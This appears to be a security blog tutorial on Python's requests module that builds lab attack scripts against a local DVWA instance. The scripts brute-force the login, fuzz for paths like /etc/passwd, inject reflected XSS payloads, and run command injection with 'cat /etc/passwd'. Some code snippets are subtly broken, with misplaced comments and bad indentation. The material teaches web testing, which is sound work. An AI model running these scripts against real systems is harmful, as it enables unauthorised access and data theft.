---
date: '2022-08-26'
description: Hello, in this article, we will get to know Python's requests module, where we can write tools in the field of web application security.
draft: false
featuredImage: https://cdn-images-1.medium.com/max/800/1*a87phGSd-sbfiJLWPfGMxA.png
layout: single
series:
- Python for Hackers
title: 'Python for hackers: requests'
type: posts
---

### Python for Hackers: requests



### Introduction

Hello, in this article, we will get to know Python's *requests* module, where we can write tools in the field of web application security.

What is ###requests?

[requests](https://requests.readthedocs.io/) is a simple but elegant HTTP module of Python. It allows you to send HTTP requests extremely easily. For requests made with the GET method, you do not need to manually add query strings to your URLs or formally encode your POST data, the requests module takes care of these tasks for you. In this article, we will write various web tools with *requests*, but let's take a look at the installation first. We assume that you have a basic knowledge of the Python language and continue. If you want, you can also look at the [articles](https://pwnlab.me/intermediate-python-articles/) about Python on our website.

### Installation

To install the request module, you can type the following command on your terminal screen.

```
python -m pip install requests
```

After the installation is completed, if you do not receive an error when you create a python file and write and run the code below, your installation is successful.

```
import requests
```

Now let's examine the structure of this module a little.

#### Methods

Although the request module has many methods, the important ones for us are the methods in which we make GET and POST requests. If you don't know what these are, you can search for [HTTP request](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods) methods.

**get()**The type of request we use most is the GET request. When we enter any web page in our browser, we actually send a GET request. When we send a GET request to a URL address, it returns us the HTML dump (page source) of the page, and our browser interprets this HTML and shows us the page. (Not only HTML but also CSS and Javascript codes come with it, but we have no business with them) We can make GET requests with the *requests.get()* method. Its usage is basically as follows: *get(url, params, args)*

**post()**The POST method is generally used when submitting [HTML forms](https://www.w3schools.com/html/html_forms.asp). This method is used on login and registration pages. So we will use this method to perform a brute force attack on a login page. Unlike the GET method, the parameters/data we send with this method are not added to the URL. The *requests.post()* method is used to send POST requests. Its usage is basically as follows. *post(url, data, json, args)*

#### Parameters

**url** is the address of the web page to which we will send the GET or POST request.

**params, data, json, files**These parameters are the parameters/data we will send with GET or POST request. *params* are used in the get() method and others are used in the post() method. The use of these methods depends on the target site. If the target site does not receive a parameter value, there is no need to use them. If it takes parameters, that is, if it is an HTML form, we need to send the desired data to the *name* tag values.

***params****:* In the get() method, it receives parameters/data in *tuple* structure.   
**data:** The post() method takes parameters/data in the *tuple* structure.   
***json****:* In the post() method, it takes parameters/data in *json* structure.   
***files****:* In the post() method, it takes parameters/data in XML or different file types. In the GET request, parameters, that is, data, are added to the rest of the URL. Therefore, we can add parameters by directly editing the URL, or we can give data in the *dictionary* structure to the *params* parameter of the get() method. For this:

```
params = {'key1': 'value1', 'key2': 'value2'}
```

We define the parameters in the dictionary structure. When we make a request with these parameters, the parameters are added to the end of the URL as follows.

```
https://httpbin.org/get?key2=value2&key1=value1
```

Now let's send a GET request by writing a small Python code.

```
import requests  
params = {'key1': 'value1', 'key2': 'value2'}  
response = requests.get('https://httpbin.org/get', params=params)
```

There are different ways to send data via POST request. Data can be sent in dictionary structure or json structure as in GET request: to send data in dictionary structure:

```
data = {'key1': 'value1', 'key2': 'value2'}
```

You can use the [json](https://docs.python.org/3/library/json.html) module to send data in json structure.

#### **args**

The arguments are the same for the get() and post() methods and are optional.If not used, it is executed with its default values.

***allow\_redirects(bool)***   
Gets TRUE/FALSE to enable/disable redirection. By default it is TRUE. So it allows redirects.  
***auth(tuple)***   
Used to enable a specific HTTP authentication. Defaults to NULL, does not authenticate   
***cert(tuple)***   
Retrieves a certificate file in *tuple* structure. By default it takes NULL value.  
 ***cookies(dict)***   
Retrieves the cookie dictionary to send to the specified url. It does not send cookies by default.   
***headers(dict)***   
Gets the HTTP header to be sent to the specified url. It does not send headers by default.   
***proxies(dict)***   
Retrieves the protocol to be sent to the proxy URL. By default it takes NULL value.   
***stream(bool)*** Determines whether the response will be downloaded immediately (FALSE) or streamed (TRUE). By default it is FALSE, meaning the response is downloaded immediately.   
***timeout(int)*** Gets the timeout duration, which represents how many seconds to wait for the client to establish a connection and/or send a response. By default it is NULL, which means the request will continue until the connection is closed   
***verify(bool)***   
It takes a value of TRUE to verify the TLS certificate of the servers and FALSE to turn off verification. By default it is TRUE.

####response

It is the response that the server returns to the request we sent. In the Python codes we wrote, we kept the response we received with the *get()* method in a variable named *response*. Now let's examine the content of this answer.

```
print(response.text)
```

We can print the content of the response as text. A text like the one below will appear.

```
{  
"args": {  
"key1": "value1",   
"key2": "value2"  
},   
"headers": {  
"Accept": "*/*",   
"Accept-Encoding": "gzip, deflate",   
"host": "httpbin.org",   
"User-Agent": "python-requests/2.28.1",   
"X-Amzn-Trace-Id": "Root=1-62e23811-6a7c14dc2c3bc62026eebb0c"  
},   
"origin": "185.51.36.100",   
"url": "https://httpbin.org/get?key1=value1&key2=value2"  
}
```

Here we see information about the answer we received. Let's also look at the type of response we receive.

```
>>print(type(response))
```

```
<class 'requests.models.Response'>
```

We understand that it is an object of type requests.models.Response. Looking at the [source code](https://requests.readthedocs.io/en/latest/_modules/requests/models/):

![](https://cdn-images-1.medium.com/max/800/0*L_iXdDv3gSm2uu6j.png)

We see a long code. You can also access its documentation [here](https://requests.readthedocs.io/en/latest/api/#requests.Response). What is important for us here are the attiributes written in the \_\_attrs\_\_ section.

```
print(response.__attrs__)
```

```
['_content', 'status_code', 'headers', 'url', 'history', 'encoding', 'reason', 'cookies', 'elapsed', 'request']
```

We can also see these attributes with the code above. With these attributes, we can reach the values ​​written in the text we receive from *response.text*, but what is important for us here is *content*.

```
print(response.content)
```

will return us the page source. Now let's make an application that takes the address of the given website and saves its source in an html file.

```
import requests
```

```
response = requests.get('https://www.google.com.tr')  
f = open("source.html","w")  
f.write(str(response.content))  
f.close()
```

You can see that the page source is pulled as follows. (with CSS and Javascript codes)

![](https://cdn-images-1.medium.com/max/800/0*W3QQk0ZEoY20GPcY.png)

You can parse the page source with the [BeautifulSoup](https://pypi.org/project/beautifulsoup4/) module and get the information you want from it. But in this article we will do something different.

### Pulling malicious websites from Usom

[USOM](https://www.usom.gov.tr/)(National Cyber Incident Response Center) is an organization that operates on a 24/7 basis against cyber incidents in our country. It has a list in which it indexes harmful sites on the internet. You can access this list [here](http://www.usom.gov.tr/url-list.txt). Now let's try to pull this list with Python.

```
import requests  
response = requests.get("http://www.usom.gov.tr/url-list.txt", verify=False)  
with open("usom.txt", "wb") as binary_file:  
  binary_file.write(response.content)
```

We were able to pull this list with a simple GET request. Now, make sure that a URL we have is included in this list.Let's write a function that checks whether it is valid or not.

```
def check(url):  
  f = open("usom.txt")  
  lines = f.read()  
  lines = lines.split('\n')  
  for line in lines:  
    if line == url:  
    text = url+" is harmful"  
    return text
```

```
  text = url+" is not harmful."  
  return text
```

We have created an application that searches for the URL we gave to the function in the text file it finds, and returns it as harmless if it does not find that it is harmful to us.

### Brute Force Attack

Brute Force Attack is a simple but still effective type of attack that we can use to log into a web page using trial and error management in the hope of finding the right one. Let's see how we can do this with our python application. I will use the DVWA app for this.

![](https://cdn-images-1.medium.com/max/800/0*D7cpaI2bY2tgv3Ig.png)

Here I listened to my login page with the [burp suite](https://portswigger.net/burp) tool. I entered the value 'aa' in the username and password fields and pressed the login button. The GET request was captured in the HTTP History section on my burp tool. Of course, you can also use different tools for this. We will use some of the information here. First of all, since we access the DVWA page by logging in, our Python application also needs to access the session somehow. So what is a session? To put it briefly, when we log in from a login page with our username/password information, we actually start a session. The session is terminated when we finish our work and close our browser or when a certain amount of time has passed. Web applications use cookies when creating a session; two cookies are created, one on the client computer and one on the server. The session continues as long as both cookies are not lost. Here, we will log in to the DVWA page and give the session cookie we received to our Python application, allowing it to access the web page with our session. The field marked in the Burp tool ‘PHPSESID’ is our session cookie. But we better hurry, the session is running out…

```
import requests
```

```
header = {"Cookie": "security=low; PHPSESSID=2d9gb38rft9o87vv22vbtnlu91"} #We give the session cookie to the header.
```

```
usernames = ["admin", "root", "user", "aa"] #list of usernames we will use in the experiments  
passwords = ["resu", "password", "toor", "1234"] #list of passwords we will use in the tests
```

```
for i in usernames:  
  for j in passwords:  
    url = f"http://10.0.2.4/dvwa/vulnerabilities/brute/?username={i}&password={j}&Login=Login"  
    #Since our application works with GET request, we can try it by adding username and password information to the URL.  
    result = requests.get(url=url, headers=header)  
    if not "Username and/or password incorrect" in str(result.content):  
      print("Username: ", i)  
      print("password: ", j)  
      print("Status code: ",result.status_code)  
      print("Length: ", len(result.content))  
      print("Username and Password is found")
```

![](https://cdn-images-1.medium.com/max/800/0*WFaG5gXYv4_u5frj.png)

When we write the code in the python file and run it, it will make tests by sending GET requests to the live DVWA server.

And yes, our attack was successful, we found the username and password information. Since the GET method was used on this web page, we were able to easily perform the attack by editing the URL. If the POST method had been used, we could have created a tuple according to the names of the *name* attributes in the HTML form and given it to the *data* parameter of the post() method and carried out our attack. That's enough tips, the rest is up to you...

### URL Fuzzing

In the URL Fuzzing process, a list of possible file/directory names is created and an http request is sent to the system. In this way, directories and files on the server are tried to be found. Of course, doing this process manually by trying it one by one is tiring. How about writing a little python code for this?

```
import requests
```

```
fuzzing_list = ['/robots.txt','/etc/','/dvwa/','/passwd','/usr/','/index.php'] #list to search  
header = {"Cookie": "security=low; PHPSESSID=0k6634cfi19e5sfn2vb754uns6"} Our session cookie on #dvwa
```

```
for i in fuzzing_list:  
  url = "http://10.0.2.4"+str(i) #We are trying to fuzz the rest of the dvwa server's IP address  
  result = requests.get(url = url, headers = header)  
  if "200" in str(result.status_code):  
    print("file or directory is found: ",i)  
  else:  
    print("file or directory isn't found: ",i)
```

When we run the Python code, it will try the directory and file names in the list and give us the following result.

![](https://cdn-images-1.medium.com/max/800/0*P0_DM5nuoLcNWX16.png)

### XSS Attack

XSS** is a security vulnerability that occurs when values taken from web page inputs are included in the page source without filtering. This is because harmful javascript codes may be included in the page from unfiltered input. There are many XSS scripts that can reveal this vulnerability. You can access a list I found on Github [here](https://github.com/payloadbox/xss-payload-list). In this application, we will make an application that checks whether the values in a list containing XSS scripts are added to the page source by sending them to the page. For this, I gave the session cookie we made in the previous application to the header variable again, I will not explain this part again.

Our DVWA page works with GET request again, so we will use the *requests.get()* function. What we write in the input section is written in the *name* section of the URL. Based on this, we will give our XSS scripts to the *name* parameter.

```
import requests
```

```
header = {"Cookie": "security=low; PHPSESSID=2d9gb38rft9o87vv22vbtnlu91"}  
xss_list = ["<h1>xss</h1>","<script>alert('xss')</script>","<script>prompt('xss')</script>","XSS","alert('xss')"]
```

```
for payload in xss_list:  
  url="http://10.0.2.4/dvwa/vulnerabilities/xss_r/?name="+payload Giving scripts to the #name parameter  
  result = requests.get(url=url, headers=header) # Making the GET request  
  if str(payload) in str(result.content):  
    print("Possible XSS found: "+str(payload))
```

When we write the code in the python file and run it, it will make tests by sending GET requests to the live DVWA server.

![](https://cdn-images-1.medium.com/max/800/0*5GN1pw6l0XKQVsRQ.png)

If we look at the result we got, our XSS scripts did not work because the web page was filtering. <h1>xss</h1> was an HTML injection script, while XSS is just a plain string. You can try different XSS scripts.

### Command Injection Attack

Command injection is a type of vulnerability also known as code execution vulnerability. Running it in the server shell without filtering the input causes this vulnerability. In this way, the attacker can run any malicious code he wants in the server shell. We will use DVWA's command injection web page in our application.

![](https://cdn-images-1.medium.com/max/800/0*Ik2wa2BdVo1Kxt3p.png)

There is an entry here that pings the given IP address. When we add a semicolon to the rest of the ip and try to run the ls command, we see that it works and lists the server directory. Based on this, we can determine that there is a command injection vulnerability on this page. Now let's see how we can detect this vulnerability with Python.

![](https://cdn-images-1.medium.com/max/800/0*64jFt9fe7MaTcEu7.png)

When we listen to the request we sent to the page with burp, we can see that this request was made with a POST method and the parameters sent. As we did in previous applications, we will give our session cookie ('PHPSESSID) to our header parameter. Next, since it is a POST request, we will create a data tuple structure and give it to our post() method.

```
import requests
```

```
command = "cat /etc/passwd" #the command we want to run  
header = {"Cookie": "security=low; PHPSESSID=0k6634cfi19e5sfn2vb754uns6"} #session cookie  
url = "http://10.0.2.4/dvwa/vulnerabilities/exec/" #web address we will attack  
data = {"ip":"127.0.0.1;"+command,"Submit":"Submit"} The parameters we will send with the #POST method  
response = requests.post(url=url, data=data, headers=header) #sending the request
```

```
if "www-data" in str(response.content):  
  print("command injection vulnerability found!")
```

'www-data' consists of a string that we can understand that the command is working when it is found in the response, it is located in the passwd file. Using this method, you can run longer commands sequentially with Python.

![](https://cdn-images-1.medium.com/max/800/0*HJlxB5W113qQFTkD.png)

As a result, we found the vulnerability by running the python code.

### End

I welcome comments on what other operations we can do in the field of web security with Python…